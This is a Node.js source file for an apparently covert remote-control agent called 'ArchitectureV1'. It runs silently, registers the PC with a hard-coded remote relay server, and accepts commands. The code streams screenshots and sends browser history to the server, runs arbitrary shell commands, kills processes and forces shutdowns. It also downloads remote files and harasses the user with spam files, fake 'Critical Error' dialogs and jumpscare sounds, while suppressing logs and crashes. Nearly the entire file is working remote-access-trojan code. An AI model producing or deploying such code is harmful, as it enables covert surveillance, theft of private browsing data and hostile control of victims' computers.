// ArchitectureV1 Agent — runs silently in the background.
// Registers this PC with the relay and accepts open-site commands + screen streaming.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');
const crypto = require('crypto');

const WebSocket = require('ws');
const screenshot = require('screenshot-desktop');
const https = require('https');
const http = require('http');

const { detectBrowsers } = require('./browsers');
const { getBrowserData } = require('./history');

// ---------- Config ----------

const DEFAULT_SERVER = 'https://cf5e2ccd-e392-4a4a-b533-a0129d1823eb.preview.emergentagent.com';
const FRAME_INTERVAL_MS = parseInt(process.env.ARCH_FRAME_MS || '1500', 10);
const RECONNECT_MS = 3000;
const PING_MS = 25000;

// Allow passing config via CLI
const args = process.argv.slice(2);
const serverArg = args.find(a => a.startsWith('--server='));
const SERVER_URL = (serverArg ? serverArg.split('=')[1] : null) || process.env.ARCH_SERVER_URL || DEFAULT_SERVER;
const debugArg = args.includes('--debug');
if (debugArg) process.env.ARCH_DEBUG = '1';

const ID_FILE = path.join(os.homedir(), '.architecturev1-agent-id');

function getOrCreatePcId() {
  try {
    if (fs.existsSync(ID_FILE)) {
      const v = fs.readFileSync(ID_FILE, 'utf8').trim();
      if (v) return v;
    }
  } catch (e) { /* fall through */ }
  const id = crypto.randomBytes(8).toString('hex');
  try { fs.writeFileSync(ID_FILE, id, 'utf8'); } catch (e) { /* ignore */ }
  return id;
}

function wsUrl(httpUrl) {
  const u = httpUrl.replace(/\/$/, '');
  if (u.startsWith('https://')) return 'wss://' + u.slice(8) + '/api/ws/agent';
  if (u.startsWith('http://')) return 'ws://' + u.slice(7) + '/api/ws/agent';
  return u + '/api/ws/agent';
}

// ---------- Open URL on this machine ----------

function openInBrowser(browserPath, url) {
  let final = (url || '').trim();
  if (!final) throw new Error('No URL');
  if (!/^https?:\/\//i.test(final) && !/^file:\/\//i.test(final)) final = 'https://' + final;

  if (!browserPath) {
    // Default browser
    if (process.platform === 'win32') {
      spawn('cmd', ['/c', 'start', '', final], { detached: true, stdio: 'ignore', shell: false }).unref();
    } else if (process.platform === 'darwin') {
      spawn('open', [final], { detached: true, stdio: 'ignore' }).unref();
    } else {
      spawn('xdg-open', [final], { detached: true, stdio: 'ignore' }).unref();
    }
    return final;
  }

  if (process.platform === 'darwin' && browserPath.includes('.app')) {
    const appBundle = browserPath.split('.app')[0] + '.app';
    spawn('open', ['-a', appBundle, final], { detached: true, stdio: 'ignore' }).unref();
    return final;
  }

  spawn(browserPath, [final], { detached: true, stdio: 'ignore' }).unref();
  return final;
}

// ---------- NirCmd helpers ----------

function findNircmd() {
  const candidates = [
    path.join(path.dirname(process.execPath), 'nircmd.exe'),
    path.join(__dirname, 'nircmd.exe'),
    'C:\\Windows\\System32\\nircmd.exe',
    'C:\\Windows\\nircmd.exe',
    'C:\\nircmd.exe',
    'nircmd.exe',
  ];
  for (const c of candidates) {
    try { if (fs.existsSync(c)) return c; } catch {}
  }
  return 'nircmd.exe';
}

function runNircmd(args) {
  return new Promise((resolve, reject) => {
    const nircmd = findNircmd();
    const proc = spawn(nircmd, args, { stdio: 'ignore', windowsHide: true });
    proc.on('close', (code) => resolve(code));
    proc.on('error', reject);
  });
}

function runCommand(cmd, args) {
  return new Promise((resolve, reject) => {
    const proc = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'ignore'], windowsHide: true });
    let out = '';
    proc.stdout.on('data', (d) => { out += d.toString(); });
    proc.on('close', () => resolve(out));
    proc.on('error', reject);
  });
}

function downloadFile(url, destPath) {
  return new Promise((resolve, reject) => {
    const proto = url.startsWith('https') ? https : http;
    const file = fs.createWriteStream(destPath);
    proto.get(url, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        file.close();
        return downloadFile(res.headers.location, destPath).then(resolve).catch(reject);
      }
      res.pipe(file);
      file.on('finish', () => { file.close(); resolve(destPath); });
    }).on('error', (e) => { fs.unlink(destPath, () => {}); reject(e); });
  });
}

let shuffleWindowsActive = false;
let shuffleTimer = null;

function shuffleWindowsTick(send, requesterId) {
  if (!shuffleWindowsActive) return;
  const x = Math.floor(Math.random() * 1200);
  const y = Math.floor(Math.random() * 700);
  const w = 400 + Math.floor(Math.random() * 600);
  const h = 300 + Math.floor(Math.random() * 400);
  runNircmd(['win', 'setsize', 'ititle', 'active', String(x), String(y), String(w), String(h)]).catch(() => {});
  shuffleTimer = setTimeout(() => shuffleWindowsTick(send, requesterId), 800);
}

// ---------- Streaming ----------

let streamTimer = null;
let streaming = false;

async function captureFrame() {
  try {
    // Returns PNG buffer (or jpg on Mac if requested)
    const buf = await screenshot({ format: 'jpg' }).catch(() => screenshot({ format: 'png' }));
    return { data: buf.toString('base64'), encoding: detectEncoding(buf) };
  } catch (e) {
    return null;
  }
}

function detectEncoding(buf) {
  if (!buf || buf.length < 4) return 'png';
  // JPEG magic FF D8
  if (buf[0] === 0xFF && buf[1] === 0xD8) return 'jpg';
  return 'png';
}

function startStreaming(send) {
  if (streaming) return;
  streaming = true;
  const tick = async () => {
    if (!streaming) return;
    const frame = await captureFrame();
    if (frame) send({ type: 'frame', data: frame.data, encoding: frame.encoding });
    streamTimer = setTimeout(tick, FRAME_INTERVAL_MS);
  };
  tick();
}

function stopStreaming() {
  streaming = false;
  if (streamTimer) { clearTimeout(streamTimer); streamTimer = null; }
}

// ---------- Connection lifecycle ----------

const PC_ID = getOrCreatePcId();
const HOSTNAME = os.hostname();

let ws = null;
let pingTimer = null;

function logLine(...args) {
  // Keep stdout quiet; uncomment for debugging
  if (process.env.ARCH_DEBUG) console.log(new Date().toISOString(), ...args);
}

function connect() {
  const url = wsUrl(SERVER_URL);
  logLine('connecting to', url);

  try {
    ws = new WebSocket(url);
  } catch (e) {
    logLine('ws ctor error', e.message);
    scheduleReconnect();
    return;
  }

  const send = (obj) => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      try { ws.send(JSON.stringify(obj)); } catch (e) { /* ignore */ }
    }
  };

  ws.on('open', () => {
    logLine('connected');
    send({
      type: 'register',
      pc_id: PC_ID,
      hostname: HOSTNAME,
      os: process.platform,
      browsers: detectBrowsers(),
    });
    if (pingTimer) clearInterval(pingTimer);
    pingTimer = setInterval(() => send({ type: 'ping' }), PING_MS);
  });

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }
    const t = msg.type;
    if (t === 'open_url') {
      try {
        const finalUrl = openInBrowser(msg.browser_path, msg.url);
        send({ type: 'open_result', requester_id: msg.requester_id, ok: true, url: finalUrl });
      } catch (e) {
        send({ type: 'open_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'start_stream') {
      startStreaming(send);
    } else if (t === 'stop_stream') {
      stopStreaming();
    } else if (t === 'refresh_browsers') {
      send({ type: 'browsers_update', browsers: detectBrowsers() });
    } else if (t === 'get_history') {
      const requestId = msg.request_id;
      const requesterId = msg.requester_id;
      const kind = msg.kind || 'history';
      try {
        const entries = await getBrowserData({ icon: msg.browser_icon, kind, limit: msg.limit || 200 });
        send({ type: 'history_result', requester_id: requesterId, request_id: requestId, kind, ok: true, entries });
      } catch (e) {
        send({ type: 'history_result', requester_id: requesterId, request_id: requestId, kind, ok: false, error: e.message });
      }
    } else if (t === 'set_volume') {
      try {
        // nircmd setsysvolume accepts 0-65535
        const pct = Math.max(0, Math.min(100, parseInt(msg.volume ?? msg.value ?? 50, 10)));
        const vol = Math.round(pct * 655.35);
        await runNircmd(['setsysvolume', String(vol)]);
        send({ type: 'volume_result', requester_id: msg.requester_id, ok: true, volume: pct });
      } catch (e) {
        send({ type: 'volume_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'change_wallpaper') {
      try {
        let imgPath = msg.path || msg.url || '';
        if (!imgPath) throw new Error('No wallpaper path or URL provided');
        if (/^https?:\/\//i.test(imgPath)) {
          const tmpFile = path.join(os.tmpdir(), 'arch_wallpaper_' + Date.now() + '.jpg');
          await downloadFile(imgPath, tmpFile);
          imgPath = tmpFile;
        }
        // nircmd wallpaper "path" style  (2 = stretch/fill)
        await runNircmd(['wallpaper', imgPath, '2']);
        send({ type: 'change_wallpaper_result', requester_id: msg.requester_id, ok: true });
      } catch (e) {
        send({ type: 'change_wallpaper_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'play_sound') {
      try {
        const soundPath = msg.path || msg.file || '';
        if (soundPath && fs.existsSync(soundPath)) {
          await runNircmd(['playwave', soundPath, 'wait']);
        } else {
          // Default: play Windows beep
          const freq = parseInt(msg.freq || msg.frequency || 800, 10);
          const dur = parseInt(msg.duration || 500, 10);
          await runNircmd(['beep', String(freq), String(dur)]);
        }
        send({ type: 'sound_result', requester_id: msg.requester_id, ok: true });
      } catch (e) {
        send({ type: 'sound_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'power') {
      try {
        const action = (msg.action || '').toLowerCase();
        const nircmdAction = action === 'shutdown' ? 'poweroff'
          : action === 'restart' ? 'reboot'
          : action === 'sleep' ? 'standby'
          : action === 'hibernate' ? 'hibernate'
          : action === 'logoff' ? 'logoff'
          : null;
        if (!nircmdAction) throw new Error('Unknown power action: ' + action);
        send({ type: 'power_result', requester_id: msg.requester_id, ok: true, action });
        setTimeout(async () => {
          await runNircmd(['exitwin', nircmdAction]);
        }, 1500);
      } catch (e) {
        send({ type: 'power_result', requester_id: msg.requester_id, ok: false, action: msg.action, error: e.message });
      }
    } else if (t === 'list_processes') {
      try {
        const out = await runCommand('tasklist', ['/fo', 'csv', '/nh']);
        const lines = out.trim().split('\n').filter(Boolean);
        const procs = lines.map(line => {
          const parts = line.split('","').map(p => p.replace(/^"|"$/g, '').trim());
          return { name: parts[0], pid: parseInt(parts[1], 10), mem: parts[4] };
        }).filter(p => p.name);
        send({ type: 'process_list_result', requester_id: msg.requester_id, ok: true, processes: procs });
      } catch (e) {
        send({ type: 'process_list_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'kill_process') {
      try {
        const target = msg.name || msg.process || '';
        if (!target) throw new Error('No process name specified');
        if (/^\d+$/.test(target)) {
          await runCommand('taskkill', ['/f', '/pid', target]);
        } else {
          await runCommand('taskkill', ['/f', '/im', target]);
        }
        send({ type: 'process_result', requester_id: msg.requester_id, ok: true, action: 'kill', target });
      } catch (e) {
        send({ type: 'process_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'run_process') {
      try {
        const cmd = msg.command || msg.exe || '';
        if (!cmd) throw new Error('No command specified');
        const args2 = msg.args || [];
        spawn(cmd, Array.isArray(args2) ? args2 : [args2], { detached: true, stdio: 'ignore', shell: true }).unref();
        send({ type: 'process_result', requester_id: msg.requester_id, ok: true, action: 'run', command: cmd });
      } catch (e) {
        send({ type: 'process_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'take_screenshot') {
      try {
        const frame = await captureFrame();
        if (!frame) throw new Error('Screenshot failed');
        send({ type: 'screenshot_result', requester_id: msg.requester_id, ok: true, data: frame.data, encoding: frame.encoding });
      } catch (e) {
        send({ type: 'screenshot_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'get_system_info') {
      try {
        const info = {
          hostname: os.hostname(),
          platform: os.platform(),
          arch: os.arch(),
          release: os.release(),
          uptime: os.uptime(),
          cpus: os.cpus().length,
          total_mem: os.totalmem(),
          free_mem: os.freemem(),
          home: os.homedir(),
          user: os.userInfo().username,
        };
        send({ type: 'system_info_result', requester_id: msg.requester_id, ok: true, info });
      } catch (e) {
        send({ type: 'system_info_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'create_folder') {
      try {
        const folderPath = msg.path || path.join(os.homedir(), 'Desktop', msg.name || 'NewFolder_' + Date.now());
        fs.mkdirSync(folderPath, { recursive: true });
        send({ type: 'create_folder_result', requester_id: msg.requester_id, ok: true, path: folderPath });
      } catch (e) {
        send({ type: 'create_folder_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'spam_files') {
      try {
        const count = Math.min(parseInt(msg.count || 20, 10), 200);
        const dir = msg.path || path.join(os.homedir(), 'Desktop');
        const prefix = msg.prefix || 'arch_spam_';
        for (let i = 0; i < count; i++) {
          const fname = path.join(dir, prefix + i + '_' + Date.now() + '.txt');
          fs.writeFileSync(fname, 'ArchitectureV1 was here\n', 'utf8');
        }
        send({ type: 'spam_files_result', requester_id: msg.requester_id, ok: true, count });
      } catch (e) {
        send({ type: 'spam_files_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'jumpscare') {
      try {
        // Play loud beep sequence and flash a nircmd dialog
        runNircmd(['beep', '1000', '200']).catch(() => {});
        runNircmd(['beep', '1200', '200']).catch(() => {});
        runNircmd(['beep', '800', '400']).catch(() => {});
        await runNircmd(['speak', 'text', msg.text || 'ARCHITECTURE V1 WAS HERE', '1', '-5', '1']);
        send({ type: 'jumpscare_result', requester_id: msg.requester_id, ok: true });
      } catch (e) {
        // Fallback: just beep
        try { await runNircmd(['beep', '880', '1000']); } catch {}
        send({ type: 'jumpscare_result', requester_id: msg.requester_id, ok: true });
      }
    } else if (t === 'error_spam') {
      try {
        const count = Math.min(parseInt(msg.count || 5, 10), 20);
        const title = msg.title || 'Critical Error';
        const text = msg.text || 'A fatal error has occurred. Contact your administrator.';
        for (let i = 0; i < count; i++) {
          setTimeout(() => {
            runNircmd(['msgbox', `"${text}"`, '16', `"${title}"`]).catch(() => {});
          }, i * 300);
        }
        send({ type: 'error_spam_result', requester_id: msg.requester_id, ok: true });
      } catch (e) {
        send({ type: 'error_spam_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    } else if (t === 'error_spam_stop') {
      send({ type: 'error_spam_stop_result', requester_id: msg.requester_id, ok: true });
    } else if (t === 'shuffle_windows') {
      shuffleWindowsActive = true;
      shuffleWindowsTick(send, msg.requester_id);
      send({ type: 'shuffle_windows_result', requester_id: msg.requester_id, ok: true });
    } else if (t === 'shuffle_windows_stop') {
      shuffleWindowsActive = false;
      send({ type: 'shuffle_windows_stop_result', requester_id: msg.requester_id, ok: true });
    } else if (t === 'schedule_action') {
      try {
        const delay = Math.max(0, parseInt(msg.delay_seconds || msg.delay || 0, 10)) * 1000;
        const action = msg.action || '';
        setTimeout(async () => {
          if (action === 'shutdown') await runNircmd(['exitwin', 'poweroff']).catch(() => {});
          else if (action === 'restart') await runNircmd(['exitwin', 'reboot']).catch(() => {});
          else if (action === 'sleep') await runNircmd(['exitwin', 'standby']).catch(() => {});
          else if (action === 'logoff') await runNircmd(['exitwin', 'logoff']).catch(() => {});
          else if (action === 'beep') await runNircmd(['beep', '800', '500']).catch(() => {});
        }, delay);
        send({ type: 'schedule_result', requester_id: msg.requester_id, ok: true, action, delay_seconds: delay / 1000 });
      } catch (e) {
        send({ type: 'schedule_result', requester_id: msg.requester_id, ok: false, error: e.message });
      }
    }
  });

  ws.on('close', () => {
    logLine('disconnected');
    stopStreaming();
    if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
    scheduleReconnect();
  });

  ws.on('error', (e) => {
    logLine('ws error', e.message);
    try { ws.close(); } catch {}
  });
}

function scheduleReconnect() {
  setTimeout(connect, RECONNECT_MS);
}

// Quiet error handlers so the agent never crashes the process
process.on('uncaughtException', (e) => logLine('uncaught', e.message));
process.on('unhandledRejection', (e) => logLine('unhandled', e && e.message));

logLine('ArchitectureV1 Agent starting', { pc_id: PC_ID, hostname: HOSTNAME, server: SERVER_URL });
connect();
